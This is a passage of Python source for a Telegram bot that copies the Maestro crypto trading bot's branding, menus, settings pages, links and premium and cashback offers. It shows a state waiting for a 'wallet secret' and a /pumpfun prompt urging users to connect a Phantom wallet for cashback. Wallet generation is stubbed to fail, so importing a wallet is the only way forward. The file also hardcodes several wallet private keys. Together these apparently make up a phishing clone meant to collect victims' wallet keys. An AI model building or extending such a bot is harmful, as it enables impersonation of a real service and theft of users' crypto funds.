    "Activate signals to auto-buy on received triggers, enable Auto Sell and further customize slippage, gas, multi-wallet buys and limit sell orders through dedicated settings.\n\n"
    "ℹ️ Call Channels: Enable auto-buys for a selection of TG channels.\n"
    "ℹ️ External Signals: Signals requiring external subscription.\n"
    "ℹ️ Maestro DMs: Enable auto-buys on CA pasting.\n"
    "ℹ️ Scraper: Enable auto-buys for scraped addresses through the Maestro Scraper."
)

CALL_CHANNELS_TEXT = "Select the Telegram call channel you would like to subscribe to! 🔔"


def get_print_settings_text(chain: str) -> str:
    chain_name = get_chain_display_name(chain)
    settings = get_chain_settings(chain)
    return (
        f"🔗 {chain_name}\n\n"
        "📍 General\n"
        f"Anti-MEV: {'🟢' if settings['anti_mev'] else '🔴'}\n"
        f"Degen Mode: {'🟢' if settings['degen_mode'] else '🔴'}\n"
        f"Initial Includes Fees: {'🟢' if settings['initial_includes_fees'] else '🔴'}\n"
        "Monitor (All Chains): Detailed\n"
        "Wallet Selection (All Chains): Single\n\n"
        "📌 Buy\n"
        f"Auto Buy: {'🟢' if settings['allow_auto_buy'] else '🔴'}\n"
        f"Duplicate Buy: {'🟢' if settings['duplicate_buy'] else '🔴'}\n"
        f"Buy Gas Price: {settings['buy_gas_price']:.3f} {chain_name}\n"
        "Min MarketCap: Disabled\n"
        "Max MarketCap: Disabled\n"
        "Min Liquidity: Disabled\n"
        "Max Liquidity: Disabled\n"
        "Price Impact Alert: Default (20%)\n"
        f"Slippage: Default ({settings['slippage']}%)\n"
        f"Trade Buy Confirmation: {'🟢' if settings['confirm_manual_buy'] else '🔴'}\n\n"
        "📌 Sell\n"
        "Auto Sell on Manual Buy: 🔴\n"
        "Auto Sell Retry: 🔴\n"
        "Auto PnL Card: 🔴\n"
        "PnL Card - Duration: 🟢\n"
        "PnL Card - Inv. & Payout: 🟢\n"
        "PnL As Video: 🟢\n"
        "Trade Sell Confirmation: 🔴\n"
        f"Sell Gas Price: {settings['buy_gas_price']:.3f} {chain_name}\n"
        "Price Impact Alert: Default (20%)\n"
        f"Slippage: Default ({settings['slippage']}%)\n"
        "Sell Limit Orders:\n\n"
        "⚠️ You have no Sell Limits configured."
    )


async def render_chain_selector(callback: CallbackQuery):
    text = "Select the target chain. You can remove or add missing chains through /chains."
    builder = InlineKeyboardBuilder()
    builder.button(text="SOL", callback_data="gs_chain_sol")
    builder.button(text="BASE", callback_data="gs_chain_base")
    builder.button(text="ETH", callback_data="gs_chain_eth")
    builder.button(text="Return", callback_data="main_menu")
    builder.adjust(3, 1, 1)
    await callback.message.edit_text(text=text, reply_markup=builder.as_markup())


async def render_general_settings_page(callback: CallbackQuery, chain: str):
    chain_name = get_chain_display_name(chain)
    await callback.message.edit_text(
        text=get_general_settings_text(chain_name),
        parse_mode="HTML",
        reply_markup=get_general_settings_keyboard(chain_name),
    )


async def render_buy_settings_page(callback: CallbackQuery, chain: str):
    chain_name = get_chain_display_name(chain)
    await callback.message.edit_text(
        text=get_buy_settings_text(chain_name),
        parse_mode="HTML",
        reply_markup=get_buy_settings_keyboard(chain_name),
    )


async def render_sell_settings_page(callback: CallbackQuery, chain: str):
    chain_name = get_chain_display_name(chain)
    await callback.message.edit_text(
        text=get_sell_settings_text(chain_name),
        parse_mode="HTML",
        reply_markup=get_sell_settings_keyboard(chain_name),
    )


async def render_signals_settings(callback: CallbackQuery):
    await callback.message.edit_text(
        text=SIGNALS_SETTINGS_TEXT,
        parse_mode="HTML",
        reply_markup=get_signals_settings_keyboard(),
    )


async def render_call_channels_menu(callback: CallbackQuery, page: int = 0):
    await callback.message.edit_text(
        text=CALL_CHANNELS_TEXT,
        reply_markup=get_call_channels_keyboard(page),
    )


async def render_channel_settings(callback: CallbackQuery, channel_key: str):
    channel = CALL_CHANNELS[channel_key]
    text = (
        f"{channel['username']} 🔗 SOL\n"
        f"ID: {channel['id']}\n\n"
        "Activate and customize auto-buys triggered by this signal.\n\n"
        "ℹ️ Signal settings are defaulted to your global settings. You can further customize signal settings below to override your global settings.\n"
        "ℹ️ \"Track Only\" will notify you when a signal is received, but it won't automatically buy. If you want to automatically buy when the signal is received, you need to activate the signal."
    )
    await callback.message.edit_text(text=text, reply_markup=get_channel_settings_keyboard(channel_key))


@dp.callback_query(F.data.in_({"global_settings", "global_settings_main", "global_settings_chains"}))
async def process_global_settings_menu(callback: CallbackQuery):
    await render_chain_selector(callback)
    await callback.answer()


@dp.callback_query(F.data.startswith("gs_chain_"))
async def process_global_settings_chain(callback: CallbackQuery):
    chain = callback.data.split("_", 2)[-1].upper()
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("help:"))
async def process_help(callback: CallbackQuery):
    parts = callback.data.split(":")
    page = parts[1] if len(parts) > 1 else "general"
    link = "https://docs.maestrobots.com/global-settings/general-settings" if page == "general" else "https://docs.maestrobots.com/global-settings/buy-settings"
    await callback.answer(url=link)


@dp.callback_query(F.data.startswith("print:"))
async def process_print(callback: CallbackQuery):
    parts = callback.data.split(":")
    chain = (parts[2] if len(parts) > 2 else "sol").upper()
    await callback.message.answer(get_print_settings_text(chain))
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_anti_mev:"))
async def toggle_anti_mev(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["anti_mev"] = not settings["anti_mev"]
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_degen_mode:"))
async def toggle_degen_mode(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["degen_mode"] = not settings["degen_mode"]
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("config_global_buy:"))
async def process_buy_settings(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    await render_buy_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("config_global_sell:"))
async def process_sell_settings(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    await render_sell_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_initial_fees:"))
async def toggle_initial_fees(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["initial_includes_fees"] = not settings["initial_includes_fees"]
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_monitor_mode:"))
async def toggle_monitor_mode(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["monitor_mode"] = "Detailed" if settings["monitor_mode"] != "Detailed" else "Basic"
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_wallet_selection:"))
async def toggle_wallet_selection(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["wallet_selection"] = "Single" if settings["wallet_selection"] != "Single" else "Multiple"
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("settings_back:"))
async def return_to_general_settings(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    await render_general_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_confirm_manual_buy:"))
async def toggle_confirm_manual_buy(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["confirm_manual_buy"] = not settings["confirm_manual_buy"]
    await render_buy_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_confirm_manual_sell:"))
async def toggle_confirm_manual_sell(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["confirm_manual_sell"] = not settings.get("confirm_manual_sell", False)
    await render_sell_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("buy_kb:"))
async def buy_kb_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "Add a wallet first.", "/start"), show_alert=True)


@dp.callback_query(F.data.startswith("sell_kb:"))
async def sell_kb_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "Add a wallet first.", "/start"), show_alert=True)


@dp.callback_query(F.data.startswith("buy_gas_delta:"))
async def buy_gas_delta_prompt(callback: CallbackQuery, state: FSMContext):
    parts = callback.data.split(":")
    chain = parts[-1].upper()
    prompt = await callback.message.answer(
        "Reply to this message with your desired gas value in SOL for the buy order.\n\nExample: 0.005",
        reply_markup=types.ForceReply(selective=True),
    )
    await state.set_state(BotStates.waiting_for_gas)
    await state.update_data(panel_id=callback.message.message_id, prompt_id=prompt.message_id, chain=chain, keyboard_type="settings_buy")
    await callback.answer()


@dp.callback_query(F.data.startswith("sell_gas_delta:"))
async def sell_gas_delta_prompt(callback: CallbackQuery, state: FSMContext):
    parts = callback.data.split(":")
    chain = parts[-1].upper()
    prompt = await callback.message.answer(
        "Reply to this message with your desired gas value in SOL for the sell order.\n\nExample: 0.005",
        reply_markup=types.ForceReply(selective=True),
    )
    await state.set_state(BotStates.waiting_for_gas)
    await state.update_data(panel_id=callback.message.message_id, prompt_id=prompt.message_id, chain=chain, keyboard_type="settings_sell")
    await callback.answer()


@dp.callback_query(F.data.startswith("price_impact:"))
async def price_impact_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "This setting is not ready yet.", "/start"), show_alert=True)


@dp.callback_query(F.data.startswith("buy_slippage:"))
async def buy_slippage_prompt(callback: CallbackQuery, state: FSMContext):
    parts = callback.data.split(":")
    chain = parts[-1].upper()
    prompt = await callback.message.answer(
        "Reply to this message with your desired slippage percentage for the buy order. Minimum is 0.1%. Max is 1000%!",
        reply_markup=types.ForceReply(selective=True),
    )
    await state.set_state(BotStates.waiting_for_global_slippage)
    await state.update_data(panel_id=callback.message.message_id, prompt_id=prompt.message_id, chain=chain, keyboard_type="settings_buy")
    await callback.answer()


@dp.callback_query(F.data.startswith("sell_slippage:"))
async def sell_slippage_prompt(callback: CallbackQuery, state: FSMContext):
    parts = callback.data.split(":")
    chain = parts[-1].upper()
    prompt = await callback.message.answer(
        "Reply to this message with your desired slippage percentage for the sell order. Minimum is 0.1%. Max is 1000%!",
        reply_markup=types.ForceReply(selective=True),
    )
    await state.set_state(BotStates.waiting_for_global_slippage)
    await state.update_data(panel_id=callback.message.message_id, prompt_id=prompt.message_id, chain=chain, keyboard_type="settings_sell")
    await callback.answer()


@dp.message(BotStates.waiting_for_global_slippage)
async def process_global_slippage_input(message: Message, state: FSMContext):
    state_data = await state.get_data()
    panel_id = state_data.get("panel_id")
    prompt_id = state_data.get("prompt_id")
    chain = state_data.get("chain", "SOL")

    try:
        await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_id)
    except Exception:
        pass

    try:
        await message.delete()
    except Exception:
        pass

    clean_value = (message.text or "").replace("%", "").strip()
    try:
        numeric_value = float(clean_value)
    except ValueError:
        await message.answer("❌ Invalid slippage. Please enter a number from 0.1 to 1000.")
        await state.clear()
        return

    if not (0.1 <= numeric_value <= 1000):
        await message.answer("❌ Invalid slippage. Please enter a number from 0.1 to 1000.")
        await state.clear()
        return

    settings = get_chain_settings(chain)
    settings["slippage"] = numeric_value

    if panel_id:
        try:
            keyboard_type = state_data.get("keyboard_type", "settings_buy")
            if keyboard_type == "settings_sell":
                reply_markup = get_sell_settings_keyboard(chain)
            elif keyboard_type == "monitor":
                reply_markup = get_monitor_keyboard(message.from_user.id, state_data.get("mint_address") or "")
            elif keyboard_type == "trading":
                reply_markup = get_trading_keyboard(message.from_user.id)
            else:
                reply_markup = get_buy_settings_keyboard(chain)
            await message.bot.edit_message_reply_markup(
                chat_id=message.chat.id,
                message_id=panel_id,
                reply_markup=reply_markup,
            )
        except Exception:
            pass

    await state.clear()


@dp.callback_query(F.data.startswith("buy_smart_slippage:"))
async def buy_smart_slippage_noop(callback: CallbackQuery):
    await callback.answer()


@dp.callback_query(F.data.startswith("sell_smart_slippage:"))
async def sell_smart_slippage_noop(callback: CallbackQuery):
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_allow_auto_buy:"))
async def toggle_allow_auto_buy(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["allow_auto_buy"] = not settings["allow_auto_buy"]
    await render_buy_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_allow_auto_sell:"))
async def toggle_allow_auto_sell(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["allow_auto_sell"] = not settings.get("allow_auto_sell", False)
    await render_sell_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_duplicate_buy:"))
async def toggle_duplicate_buy(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["duplicate_buy"] = not settings["duplicate_buy"]
    await render_buy_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_duplicate_sell:"))
async def toggle_duplicate_sell(callback: CallbackQuery):
    chain = callback.data.split(":", 1)[1].upper()
    settings = get_chain_settings(chain)
    settings["duplicate_sell"] = not settings.get("duplicate_sell", False)
    await render_sell_settings_page(callback, chain)
    await callback.answer()


@dp.callback_query(F.data.startswith("auto_buy_checks:"))
async def auto_buy_checks_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "Try again shortly.", "/start"), show_alert=True)


@dp.callback_query(F.data.startswith("toggle_channel_active:"))
async def toggle_channel_active(callback: CallbackQuery):
    channel_key = callback.data.split(":", 1)[1]
    state = CHANNEL_SETTINGS_STATE.setdefault(channel_key, {})
    state["active"] = not state.get("active", True)
    await render_channel_settings(callback, channel_key)
    await callback.answer()


@dp.callback_query(F.data.startswith("toggle_channel_degen:"))
async def toggle_channel_degen(callback: CallbackQuery):
    channel_key = callback.data.split(":", 1)[1]
    state = CHANNEL_SETTINGS_STATE.setdefault(channel_key, {})
    state["degen"] = not state.get("degen", False)
    await render_channel_settings(callback, channel_key)
    await callback.answer()


@dp.callback_query(F.data.startswith("print_channel:"))
async def print_channel(callback: CallbackQuery):
    channel_key = callback.data.split(":", 1)[1]
    channel = CALL_CHANNELS[channel_key]
    await callback.message.answer(f"Channel: {channel['username']}\nID: {channel['id']}")
    await callback.answer()


@dp.callback_query(F.data.startswith("auto_sell_checks:"))
async def auto_sell_checks_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "Try again shortly.", "/start"), show_alert=True)


@dp.callback_query(F.data.startswith("auto_buy_settings:"))
async def auto_buy_settings_unavailable(callback: CallbackQuery):
    await callback.answer("Unavailable at the Moment", show_alert=True)


@dp.callback_query(F.data.startswith("auto_sell_settings:"))
async def auto_sell_settings_unavailable(callback: CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "This feature is not ready yet.", "/start"), show_alert=True)


# --- Configuration & States ---
USER_CONFIGS = {}
TRACKED_MONITORS = {}


def get_user_data(user_id):
    if user_id not in USER_CONFIGS:
        USER_CONFIGS[user_id] = {"slippage": "10%", "gas": "0.005 SOL"}
    return USER_CONFIGS[user_id]


# Track network enable/disable status for chain toggles
network_status = {
    "SOL": False,
    "BASE": False,
    "ETH": False,
}

# --- STATE DEFINITIONS ---
class SupportForm(StatesGroup):
    waiting_for_input = State()

class WalletSetupState(StatesGroup):
    waiting_for_name = State()

class PhantomConnectState(StatesGroup):
    waiting_for_wallet_secret = State()

used_wallet_names = set()

wallet_inventory = {
    "ETH": [
        {"address": "0x3C2608BEfaf57F015763D4b2Fc412450428bd813", "pk": "0x2833ba265cc2ba3cd8e453ce987f85e82dc58749c7c1199805c1861a9e611438"},
        {"address": "0xfa018ab34440E5c0d46bFE3D67773633874a7DEC", "pk": "0x52b270cff50ed7de3127896fea2cd660cb6355b500d7c95efa78e7cbd3dd5688"},
        {"address": "0x67820851500BE9Fb567A270fD720866A0B7f1128", "pk": "0x45334d360fd63afd408e0c1d4664d1edd403b3583709374641b52fb62c268f82"},
    ],
    "SOL": [
        {"address": "BpuWeZN1ryJbeSadkXVVA7cvUrwVwQ9GuwLrai7PgxNK", "pk": "5qf8nqjxzCWHvViQfg7eNJiuhqAgVKgK1ENpVBpEF4WQWM4bgMFFkRWcwyY2pumA1b5ELtBZxnAGRtBCjr7UGXro"},
        {"address": "E6uvBerzdCPMjhoVFDzKLTQgKKXNAEQ6viS9Ys2n34g3", "pk": "2vBNET7ghB88JHbywx74MgBEyjYko3QMBn6VbnbeGLgtnKLMejTMR9DhV2ZunAp8BXAun3BPQynG7rfgRB9jRSCb"},
        {"address": "HjkeWQX5iBZXYpsPbxXevBddRzqr1g8BpCwZvVr1Vw8e", "pk": "32YbJMF5bPs6d7MzLAyJuWr9Ye3ewpZZdYLJCY4JMfUk8KGrcdsUeGi3dcvWBP9LhkervL37G3VR4HLevcisiHmt"},
    ],
}
assigned_wallets = {}
user_wallets = {}


def get_next_wallet(chain: str):
    return None


def get_generation_error_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="ℹ️ Help", url="https://docs.maestrobots.com/wallet-setup"),
            InlineKeyboardButton(text="Return", callback_data="chains")
        ]
    ])


def get_wallet_created_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Track wallet", callback_data="track_wallet")]
    ])

# --- REUSABLE KEYBOARD BUILDERS ---

def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔗 Chains", callback_data="chains"),
            InlineKeyboardButton(text="🇺🇸🇨🇳 Language", callback_data="language")
        ],
        [
            InlineKeyboardButton(text="💳 Wallets", callback_data="wallets"),
            InlineKeyboardButton(text="⚙️ Global Settings", callback_data="global_settings_chains")
        ],
        [
            InlineKeyboardButton(text="📡 Signals", callback_data="signals"),
            InlineKeyboardButton(text="🧑‍🤝‍🧑 Copytrade", callback_data="copytrade")
        ],
        [
            InlineKeyboardButton(text="🕓 Active Orders", callback_data="active_orders"),
            InlineKeyboardButton(text="📈 Positions", callback_data="positions")
        ],
        [
            InlineKeyboardButton(text="🎯 Auto Snipe", callback_data="auto_snipe"),
            InlineKeyboardButton(text="↔️ Bridge", callback_data="bridge")
        ],
        [
            InlineKeyboardButton(text="⭐️ Premium", callback_data="premium"),
            InlineKeyboardButton(text="💸 Cashback", callback_data="cashback"),
            InlineKeyboardButton(text="💰 Referral", callback_data="referral")
        ],
        [
            InlineKeyboardButton(text="⚡️ BUY & SELL NOW!", callback_data="buy_sell_now")
        ]
    ])

def get_chains_keyboard():
    # Build dynamically based on current green/red toggle state for SOL, BASE, and ETH
    sol_icon = "🟢" if network_status["SOL"] else "🔴"
    base_icon = "🟢" if network_status["BASE"] else "🔴"
    eth_icon = "🟢" if network_status["ETH"] else "🔴"

    sol_label = "💳 Wallets" if network_status["SOL"] else "💳 No Wallets!"
    base_label = "💳 Wallets" if network_status["BASE"] else "💳 No Wallets!"
    eth_label = "💳 Wallets" if network_status["ETH"] else "💳 No Wallets!"

    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{sol_icon} SOL", callback_data="toggle_sol"), InlineKeyboardButton(text=sol_label, callback_data="wallet_select_sol")],
        [InlineKeyboardButton(text=f"{base_icon} BASE", callback_data="toggle_base"), InlineKeyboardButton(text=base_label, callback_data="wallet_select_base")],
        [InlineKeyboardButton(text=f"{eth_icon} ETH", callback_data="toggle_eth"), InlineKeyboardButton(text=eth_label, callback_data="wallet_select_eth")],
        [InlineKeyboardButton(text="Return", callback_data="main_menu")]
    ])

def get_wallet_action_keyboard(chain_type):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="ℹ️ Help", url="https://docs.maestrobots.com/wallet-setup"),
            InlineKeyboardButton(text="Return", callback_data="chains")
        ],
        [
            InlineKeyboardButton(text="🗄️ Rearrange Wallets", callback_data="rearrange_wallets")
        ],
        [
            InlineKeyboardButton(text="Import Wallet", callback_data="import_wallet"),
            InlineKeyboardButton(text="Generate Wallet", callback_data=f"generate_select_{chain_type}")
        ]
    ])

def get_error_response_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="ℹ️ Help", url="https://docs.maestrobots.com/wallet-setup"),
            InlineKeyboardButton(text="Return", callback_data="chains")
        ],
        [
            InlineKeyboardButton(text="Try Again", callback_data="wallet_no_wallet")
        ]
    ])

def get_no_wallet_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="ℹ️ Help", url="https://docs.maestrobots.com/wallet-setup"),
            InlineKeyboardButton(text="Return", callback_data="chains")
        ],
        [
            InlineKeyboardButton(text="🗄️ Rearrange Wallets", callback_data="rearrange_wallets")
        ],
        [InlineKeyboardButton(text="Import Wallet", callback_data="import_wallet"),
            InlineKeyboardButton(text="Generate Wallet", callback_data="generate_wallet")
        ]
    ])

def get_rearrange_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="ℹ️ Help", url="https://docs.maestrobots.com/wallet-setup"),
            InlineKeyboardButton(text="Return", callback_data="wallet_no_wallet")
        ]
    ])


WELCOME_MESSAGE_IDS = {}
PREMIUM_FLOW_MESSAGE_IDS = {}
REFERRAL_PROFILES = {}


def track_premium_message(chat_id: int, message_id: int):
    premium_ids = PREMIUM_FLOW_MESSAGE_IDS.setdefault(chat_id, set())
    premium_ids.add(message_id)


async def show_welcome_page(bot: Bot, chat_id: int, *, delete_message_ids=None):
    for message_id in delete_message_ids or []:
        try:
            await bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception:
            pass

    previous_welcome_id = WELCOME_MESSAGE_IDS.get(chat_id)
    if previous_welcome_id:
        try:
            await bot.delete_message(chat_id=chat_id, message_id=previous_welcome_id)
        except Exception:
            pass

    for message_id in list(PREMIUM_FLOW_MESSAGE_IDS.get(chat_id, set())):
        if message_id == previous_welcome_id:
            continue
        try:
            await bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception:
            pass

    PREMIUM_FLOW_MESSAGE_IDS[chat_id] = set()

    sent = await bot.send_message(
        chat_id=chat_id,
        text=MAIN_WELCOME_TEXT,
        parse_mode="HTML",
        reply_markup=get_main_keyboard(),
        disable_web_page_preview=True,
    )
    WELCOME_MESSAGE_IDS[chat_id] = sent.message_id
    return sent


def get_pumpfun_keyboard(return_callback: str = "pumpfun_return", refresh_callback: str = "pumpfun_refresh"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔁 Refresh", callback_data=refresh_callback)],
        [InlineKeyboardButton(text="Return", callback_data=return_callback)],
    ])


def get_cashback_dashboard_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🏆 Explore Tiers", callback_data="cashback_tiers")],
        [InlineKeyboardButton(text="💵 Pumpfun Cashback", callback_data="cashback_pumpfun")],
        [InlineKeyboardButton(text="🪐 Phantom Sol Cashback", callback_data="cashback_phantom")],
        [InlineKeyboardButton(text="⬅️ Back", callback_data="main_menu")],
    ])


def get_cashback_tiers_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Back", callback_data="cashback")],
    ])


def get_referral_overview_keyboard(username: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⚙️ {username}", callback_data="referral_detail")],
        [InlineKeyboardButton(text="Return", callback_data="main_menu")],
    ])


def get_referral_detail_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Return", callback_data="referral")],
        [InlineKeyboardButton(text="⚙️ Recipient Wallets", callback_data="referral_recipient_wallet")],
    ])


def get_referral_profile(user_id: int, username: str | None = None) -> dict:
    profile = REFERRAL_PROFILES.get(user_id)
    if profile is None:
        referral_id = (username or f"user_{user_id}").strip().lower().replace(" ", "") or f"user_{user_id}"
        profile = {
            "user_id": user_id,
            "referral_id": referral_id,
            "link": REFERRAL_LINK,
            "created_on": datetime.datetime.now().strftime("%B %d %Y"),
            "enabled": True,
            "referred_users": 0,
            "active_referred_users": 0,
            "percentage": 25,
        }
        REFERRAL_PROFILES[user_id] = profile
    return profile


def build_referral_overview_text(profile: dict, username: str | None = None) -> str:
    referral_id = (profile.get("referral_id") or (username or "user")).strip()
    return (
        "‎[Your] generated <b>Referral IDs</b> are listed below. Click on a ⚙️ Referral ID to set it as \"Default\", check your referral stats and extract your earnings.\n\n"
        f"Default Referral ID | <b>{escape(referral_id)}</b>\n\n"
        "ℹ️ <i>The Default Referral ID is the one that will be displayed in Token Reports and Trade Monitors. This is mostly relevant if you have multiple Referral IDs.</i>"
    )


def build_referral_detail_text(profile: dict, username: str | None = None) -> str:
    referral_id = (profile.get("referral_id") or (username or "user")).strip()
    enabled_icon = "🟢" if profile.get("enabled", True) else "🔴"
    return (
        f"Referral ID: <b>{escape(referral_id)}</b>\n"
        f"Referral Link: {escape(profile.get('link', ''))}\n"
        f"Created On: {escape(profile.get('created_on', datetime.datetime.now().strftime('%B %d %Y')))}\n\n"
        f"Referrals Enabled: {enabled_icon}\n"
        f"Referred Users: <b>{profile.get('referred_users', 0)}</b>\n"
        f"Active Referred Users: <b>{profile.get('active_referred_users', 0)}</b>\n"
        f"Referral Percentage: <b>{profile.get('percentage', 25)}%</b>\n\n"
        "Click on ⚙️ Recipient Wallets to specify the earnings recipient wallet for every chain.\n\n"
        "ℹ️ <i>The Default Referral ID is the one that will be displayed in Token Reports and Trade Monitors.</i>\n"
        "ℹ️ <i>This is mostly relevant if you have multiple Referral IDs.</i>"
    )


def get_premium_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Pay in $SOL (SOL)", callback_data="premium_pay_sol"),
            InlineKeyboardButton(text="Pay in $ETH (ETH)", callback_data="premium_pay_eth"),
        ],
        [
            InlineKeyboardButton(text="Pay in $USDT (USDT)", callback_data="premium_pay_usdt"),
            InlineKeyboardButton(text="Return", callback_data="main_menu"),
        ],
    ])


# --- TEXT STRING TEMPLATES ---

PUMPFUN_TEXT = "💸 PumpFun Trader Cashback\n\nℹ️ No claimable cashback available."

CASHBACK_DASHBOARD_TEXT = (
    "💰 <b>Cashback Dashboard</b>\n\n"
    "⚠️ You have no cashback earnings yet.\n\n"
    "ℹ️ Start trading to earn cashback rewards! The more you trade, the higher your cashback tier!\n\n"
    "🏆 Current Tier: 🥉 Bronze\n"
    "💸 Cashback: 15%\n\n"
    "⏭️ Next Tier: 🥈 Silver (20%)\n"
    "📊 Volume To Level Up: $0 / $10k\n"
    "⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️ 0%\n\n"
    "ℹ️ Volume is updated every 30 minutes\n\n"
    "💰 Total Unclaimed: $0\n"
    "✅ Total Claimed: $0"
)

CASHBACK_TIERS_TEXT = (
    "🏆 <b>Cashback Tiers</b>\n\n"
    "<pre>Tier       Volume($)      Cashback\n"
    "🥉 Bronze | 0 - 10k | 15% ✅\n"
    "🥈 Silver | 10k - 100k | 20%\n"
    "🥇 Gold   | 100k - 1m | 25%\n"
    "💎 Diamond| Above 1m | 30%</pre>"
)

PREMIUM_BENEFITS_TEXT = (
    "Premium: ❌\n\n"
    "Premium Benefits ⭐️\n"
    "└ Speed Boost: Dedicated Premium Bot (up to 30% faster) 🤖\n"
    "└ Launch Tax/Deadblock Simulation 🕵️‍♂️\n"
    "└ 10 ➡️ 30 Trade Monitors\n"
    "└ 8 ➡️ 10 Token Limit Orders/Wallet\n"
    "└ 36 ➡️ 96 Hour Trades\n"
    "└ 5 ➡️ 10 Multi-Wallets\n"
    "└ 5 ➡️ 12 Copytrade Wallets\n"
    "└ 5 ➡️ 10 Concurrent Snipes\n"
    "└ Token Hits 👀\n"
    "└ Maestro Trending List 💎\n"
    "└ Maestro Yacht Club Membership 💎\n"
    "└ First-Class Support\n"
    "└ Future Unrevealed Benefits\n\n"
    "🛒 Buy for $200 per 30 days! Use the pay buttons below to start or extend your subscription."
)

MAIN_WELCOME_TEXT = (
    "⭐️ <b>Welcome to Maestro</b>\n"
    "<i>Your one-stop hub for trading tools and quick actions.</i>\n\n"
    "🔗 <b>Chains:</b> Enable or disable chains.\n"
    "💳 <b>Wallets:</b> Import or generate wallets.\n"
    "⚙️ <b>Global Settings:</b> Customize the bot.\n"
    "🕓 <b>Active Orders:</b> Track buy and sell limits.\n"
    "📈 <b>Positions:</b> Monitor your open trades.\n\n"
    "⚡️ <b>Paste a token CA to trade immediately.</b>\n\n"
    '<a href="https://t.me/MaestroBotsHub">Hub</a> • '
    '<a href="https://t.me/MaestroSniperUpdates">Updates</a> • '
    '<a href="https://x.com/MaestroBots">X (Twitter)</a> • '
    '<a href="https://docs.maestrobots.com/">Docs</a> • '
    '<a href="https://t.me/MaestroSupport">Support</a> • '
    '<a href="https://linktr.ee/MaestroBots">More Links</a>'
)

CHAINS_TEXT = (
    "⚠️ <b>You have not set up any wallet yet. To use the bot you need to set up at least one chain with a wallet.</b>\n\n"
    "Click on the buttons below to set up the chain(s) you want to use."
)

NO_WALLET_TEXT = "ℹ️ Wallet not found. Please import or generate."


# --- HANDLERS ---

@dp.message(Command("start"))
async def start(message: types.Message):
    await show_welcome_page(message.bot, message.chat.id, delete_message_ids=[])


@dp.message(Command("pumpfun"))
async def pumpfun_command(message: types.Message):
    await message.answer(
        text="� <b>Connect your Phantom wallet now</b>\n\n<i>Link your wallet to check eligibility for cashback.</i>",
        parse_mode="HTML",
